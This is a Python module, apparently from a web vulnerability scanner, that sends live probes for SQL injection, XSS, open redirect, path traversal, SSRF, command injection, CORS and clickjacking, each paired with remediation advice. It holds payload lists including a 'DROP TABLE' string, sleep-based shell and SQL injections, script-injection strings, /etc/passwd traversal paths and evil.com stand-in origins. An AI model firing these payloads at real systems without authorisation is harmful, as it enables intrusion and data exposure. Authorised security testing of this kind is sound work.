"""
Vulnerability Verifier
───────────────────────
Actively verifies vulnerabilities found by nuclei/recon — like Acunetix.

Covers:
  • SQL Injection (error-based, boolean-blind, time-based blind)
  • XSS (reflected, DOM hints)
  • Open Redirect
  • Path Traversal / LFI
  • SSRF hints
  • Command Injection (time-based)
  • IDOR (parameter tampering)
  • Subdomain Takeover
  • Clickjacking (header check)
  • CORS misconfiguration

Each verifier returns:
  {
    "vuln": bool,
    "type": str,
    "severity": str,
    "evidence": str,
    "payload": str,
    "url": str,
    "remediation": str,
  }
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import time
import re
import socket
import json
from typing import Optional


# ── HTTP helper ────────────────────────────────────────────────────
def _req(url: str, method: str = "GET", data: bytes = None,
         headers: dict = None, timeout: int = 10,
         proxy: str = None) -> tuple[int, str, dict]:
    """Returns (status_code, body, response_headers)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try:
        hdrs = {"User-Agent": "Mozilla/5.0 (compatible; VAPTScanner/3.0)"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        if proxy:
            req.set_proxy(proxy, "http")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(1024 * 512).decode(errors="replace")
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(1024 * 64).decode(errors="replace")
        except Exception:
            body = ""
        return e.code, body, {}
    except Exception:
        return 0, "", {}


class VulnVerifier:

    def __init__(self, log=None, proxy: str = None, timeout: int = 10):
        self.log     = log
        self.proxy   = proxy
        self.timeout = timeout

    # ── Run all verifications on a URL ─────────────────────────────
    def verify_all(self, url: str, params: list = None) -> list:
        """
        Run full verification suite on a URL.
        params: list of parameter names to test (auto-detected if None)
        """
        results = []
        base_url, detected_params = self._parse_url(url)

        test_params = params or detected_params or ["id","q","search","page","cat","user"]

        if self.log:
            self.log.info(f"  Verifying {url} | params: {test_params}")

        # Run all verifiers
        verifiers = [
            self.check_sqli,
            self.check_xss,
            self.check_open_redirect,
            self.check_path_traversal,
            self.check_ssrf_hints,
            self.check_cmd_injection,
            self.check_clickjacking,
            self.check_cors,
        ]

        for fn in verifiers:
            try:
                r = fn(url, test_params)
                if r and r.get("vuln"):
                    results.append(r)
                    if self.log:
                        self.log.finding(r["severity"], r["type"], r.get("evidence",""))
            except Exception as e:
                if self.log:
                    self.log.debug(f"  Verifier {fn.__name__} error: {e}")

        return results

    # ── SQL Injection ──────────────────────────────────────────────
    def check_sqli(self, url: str, params: list = None) -> dict:
        base_url, detected = self._parse_url(url)
        test_params = params or detected

        # Error-based payloads
        ERROR_PAYLOADS = ["'", "''", "' OR '1'='1", "'; DROP TABLE--",
                          "1' AND 1=1--", "1' AND 1=2--", "\" OR \"1\"=\"1"]
        ERROR_SIGNATURES = [
            r"sql syntax", r"mysql_fetch", r"ORA-\d+",
            r"microsoft.*sql.*server", r"syntax error.*SQL",
            r"unclosed quotation", r"quoted string not properly terminated",
            r"PostgreSQL.*ERROR", r"Warning.*mysql_",
            r"valid MySQL result", r"SQLite3::query",
            r"SQLSTATE\[", r"sqlite_.*error",
        ]

        # Time-based blind payloads
        TIME_PAYLOADS = [
            ("' AND SLEEP(3)--", 3.0),
            ("' AND pg_sleep(3)--", 3.0),
            ("' WAITFOR DELAY '0:0:3'--", 3.0),
            ("'; SELECT SLEEP(3)--", 3.0),
        ]

        for param in test_params:
            # Error-based
            for payload in ERROR_PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                _, body, _ = _req(test_url, timeout=self.timeout)
                for sig in ERROR_SIGNATURES:
                    if re.search(sig, body, re.IGNORECASE):
                        return {
                            "vuln": True, "type": "SQL Injection (Error-Based)",
                            "severity": "CRITICAL",
                            "evidence": f"DB error signature '{sig}' found in response",
                            "payload": payload, "param": param, "url": test_url,
                            "remediation": "Use parameterised queries / prepared statements. Never concatenate user input into SQL.",
                        }

            # Boolean-blind (compare responses)
            true_url  = self._inject_param(url, param, "' OR '1'='1' --")
            false_url = self._inject_param(url, param, "' OR '1'='2' --")
            _, true_body,  _ = _req(true_url,  timeout=self.timeout)
            _, false_body, _ = _req(false_url, timeout=self.timeout)
            if (len(true_body) > 50 and len(false_body) > 50 and
                    abs(len(true_body) - len(false_body)) > 100):
                return {
                    "vuln": True, "type": "SQL Injection (Boolean-Blind)",
                    "severity": "CRITICAL",
                    "evidence": f"Response length difference: {abs(len(true_body)-len(false_body))} bytes for TRUE vs FALSE payload",
                    "payload": "' OR '1'='1' vs ' OR '1'='2'",
                    "param": param, "url": url,
                    "remediation": "Use parameterised queries / prepared statements.",
                }

            # Time-based blind
            for payload, min_delay in TIME_PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                start    = time.time()
                _req(test_url, timeout=min_delay + 5)
                elapsed  = time.time() - start
                if elapsed >= min_delay * 0.85:
                    return {
                        "vuln": True, "type": "SQL Injection (Time-Based Blind)",
                        "severity": "CRITICAL",
                        "evidence": f"Response delayed {elapsed:.1f}s (expected delay: {min_delay}s)",
                        "payload": payload, "param": param, "url": test_url,
                        "remediation": "Use parameterised queries / prepared statements.",
                    }

        return {"vuln": False, "type": "SQL Injection"}

    # ── XSS ───────────────────────────────────────────────────────
    def check_xss(self, url: str, params: list = None) -> dict:
        base_url, detected = self._parse_url(url)
        test_params = params or detected

        PAYLOADS = [
            '<script>alert("VAPTFW_XSS")</script>',
            '"><script>alert(1)</script>',
            "';alert('VAPTFW')//",
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert("XSS")>',
            '<svg onload=alert(1)>',
        ]

        for param in test_params:
            for payload in PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                _, body, hdrs = _req(test_url, timeout=self.timeout)
                # Check if payload reflected unencoded
                if (payload in body or
                        payload.lower() in body.lower() or
                        "VAPTFW_XSS" in body or "VAPTFW" in body):
                    # Check Content-Type
                    ct = hdrs.get("Content-Type","")
                    if "text/html" in ct or not ct:
                        return {
                            "vuln": True, "type": "Reflected XSS",
                            "severity": "HIGH",
                            "evidence": f"Payload reflected unencoded in response (param: {param})",
                            "payload": payload, "param": param, "url": test_url,
                            "remediation": "Encode all user output. Use Content-Security-Policy header.",
                        }

        return {"vuln": False, "type": "XSS"}

    # ── Open Redirect ──────────────────────────────────────────────
    def check_open_redirect(self, url: str, params: list = None) -> dict:
        redirect_params = (params or []) + [
            "redirect", "url", "next", "return", "returnUrl", "goto",
            "redir", "redirect_uri", "continue", "dest", "destination",
        ]
        payloads = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com%2F",
            "https:evil.com",
        ]
        for param in redirect_params:
            for payload in payloads:
                test_url = self._inject_param(url, param, payload)
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode    = ssl.CERT_NONE
                    req = urllib.request.Request(test_url)
                    with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as r:
                        final_url = r.geturl()
                        if "evil.com" in final_url:
                            return {
                                "vuln": True, "type": "Open Redirect",
                                "severity": "MEDIUM",
                                "evidence": f"Redirected to {final_url}",
                                "payload": payload, "param": param, "url": test_url,
                                "remediation": "Whitelist allowed redirect destinations. Never redirect to user-supplied URLs.",
                            }
                except Exception:
                    pass

        return {"vuln": False, "type": "Open Redirect"}

    # ── Path Traversal / LFI ──────────────────────────────────────
    def check_path_traversal(self, url: str, params: list = None) -> dict:
        test_params = (params or []) + ["file","path","page","template","include","doc"]
        PAYLOADS = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "/etc/passwd",
            "../../../windows/win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        SIGNATURES = ["root:x:0:0", "bin:x:", "daemon:x:", "[boot loader]", "[fonts]"]

        for param in test_params:
            for payload in PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                _, body, _ = _req(test_url, timeout=self.timeout)
                for sig in SIGNATURES:
                    if sig in body:
                        return {
                            "vuln": True, "type": "Path Traversal / LFI",
                            "severity": "CRITICAL",
                            "evidence": f"System file content detected: '{sig}'",
                            "payload": payload, "param": param, "url": test_url,
                            "remediation": "Validate and sanitise file paths. Use allowlist for permitted files.",
                        }

        return {"vuln": False, "type": "Path Traversal"}

    # ── SSRF hints ────────────────────────────────────────────────
    def check_ssrf_hints(self, url: str, params: list = None) -> dict:
        """Check for potential SSRF parameters (hint-based, not full exploit)."""
        ssrf_params = (params or []) + [
            "url","uri","link","src","source","callback","fetch",
            "proxy","image","load","webhook","endpoint","host",
        ]
        # Just detect the parameter presence as a hint
        for param in ssrf_params:
            test_url = self._inject_param(url, param, "http://127.0.0.1/")
            _, body, _ = _req(test_url, timeout=self.timeout)
            # Any response from internal address hints
            if any(sig in body for sig in ["127.0.0.1","localhost","internal",
                                            "Connection refused","refused"]):
                return {
                    "vuln": True, "type": "SSRF (Potential)",
                    "severity": "HIGH",
                    "evidence": f"Parameter '{param}' appears to trigger internal requests",
                    "payload": "http://127.0.0.1/",
                    "param": param, "url": test_url,
                    "remediation": "Whitelist allowed destinations. Block requests to RFC1918 ranges.",
                }

        return {"vuln": False, "type": "SSRF"}

    # ── Command Injection (time-based) ─────────────────────────────
    def check_cmd_injection(self, url: str, params: list = None) -> dict:
        test_params = params or self._parse_url(url)[1]
        PAYLOADS = [
            ("; sleep 3 #", 3.0),
            ("| sleep 3", 3.0),
            ("& timeout 3 &", 3.0),
            ("$(sleep 3)", 3.0),
            ("`sleep 3`", 3.0),
        ]
        for param in (test_params or []):
            for payload, delay in PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                start    = time.time()
                _req(test_url, timeout=delay + 6)
                elapsed  = time.time() - start
                if elapsed >= delay * 0.85:
                    return {
                        "vuln": True, "type": "Command Injection (Time-Based)",
                        "severity": "CRITICAL",
                        "evidence": f"Response delayed {elapsed:.1f}s with OS sleep payload",
                        "payload": payload, "param": param, "url": test_url,
                        "remediation": "Never pass user input to OS commands. Use allowlists and sandboxing.",
                    }

        return {"vuln": False, "type": "Command Injection"}

    # ── Clickjacking ───────────────────────────────────────────────
    def check_clickjacking(self, url: str, params: list = None) -> dict:
        _, _, hdrs = _req(url, timeout=self.timeout)
        xfo = hdrs.get("X-Frame-Options","").upper()
        csp = hdrs.get("Content-Security-Policy","")

        protected = (xfo in ("DENY","SAMEORIGIN") or
                     "frame-ancestors" in csp.lower())
        if not protected:
            return {
                "vuln": True, "type": "Clickjacking",
                "severity": "MEDIUM",
                "evidence": "Missing X-Frame-Options and CSP frame-ancestors",
                "payload": "<iframe> embedding",
                "url": url,
                "remediation": "Add 'X-Frame-Options: DENY' or CSP 'frame-ancestors none'.",
            }

        return {"vuln": False, "type": "Clickjacking"}

    # ── CORS misconfiguration ──────────────────────────────────────
    def check_cors(self, url: str, params: list = None) -> dict:
        _, _, hdrs = _req(url, headers={"Origin": "https://evil.com"},
                          timeout=self.timeout)
        acao = hdrs.get("Access-Control-Allow-Origin","")
        acac = hdrs.get("Access-Control-Allow-Credentials","")

        if acao == "*" and "true" in acac.lower():
            return {
                "vuln": True, "type": "CORS Misconfiguration",
                "severity": "HIGH",
                "evidence": f"ACAO: {acao} + ACAC: {acac} — any origin can make credentialed requests",
                "payload": "Origin: https://evil.com",
                "url": url,
                "remediation": "Never combine wildcard ACAO with Allow-Credentials: true.",
            }

        if acao == "https://evil.com":
            return {
                "vuln": True, "type": "CORS Origin Reflection",
                "severity": "HIGH",
                "evidence": "Server reflects arbitrary Origin header value",
                "payload": "Origin: https://evil.com",
                "url": url,
                "remediation": "Whitelist allowed origins. Never reflect request Origin header.",
            }

        return {"vuln": False, "type": "CORS"}

    # ── Subdomain takeover ─────────────────────────────────────────
    def check_subdomain_takeover(self, subdomain: str) -> dict:
        """Check if subdomain CNAME points to unclaimed service."""
        TAKEOVER_SIGNATURES = {
            "github.io":       "There isn't a GitHub Pages site here",
            "herokuapp.com":   "No such app",
            "s3.amazonaws.com":"NoSuchBucket",
            "azurewebsites.net":"404 Web Site not found",
            "shopify.com":     "Sorry, this shop is currently unavailable",
            "fastly.net":      "Fastly error",
            "netlify.app":     "Not Found",
            "surge.sh":        "project not found",
            "tumblr.com":      "Whatever you were looking for doesn't currently exist",
        }
        try:
            import socket
            cname = socket.getfqdn(subdomain)
        except Exception:
            return {"vuln": False, "type": "Subdomain Takeover"}

        for service, signature in TAKEOVER_SIGNATURES.items():
            if service in cname:
                _, body, _ = _req(f"http://{subdomain}", timeout=self.timeout)
                if signature.lower() in body.lower():
                    return {
                        "vuln": True, "type": "Subdomain Takeover",
                        "severity": "HIGH",
                        "evidence": f"CNAME → {cname} | Unclaimed page: '{signature}'",
                        "payload": subdomain,
                        "url": f"http://{subdomain}",
                        "remediation": f"Claim the {service} resource or remove the DNS record.",
                    }

        return {"vuln": False, "type": "Subdomain Takeover"}

    # ── Helpers ───────────────────────────────────────────────────
    def _parse_url(self, url: str) -> tuple[str, list]:
        parsed = urllib.parse.urlparse(url)
        params = list(urllib.parse.parse_qs(parsed.query).keys())
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return base, params

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if param in qs:
            qs[param] = [value]
        else:
            qs[param] = [value]
        new_qs  = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_qs))
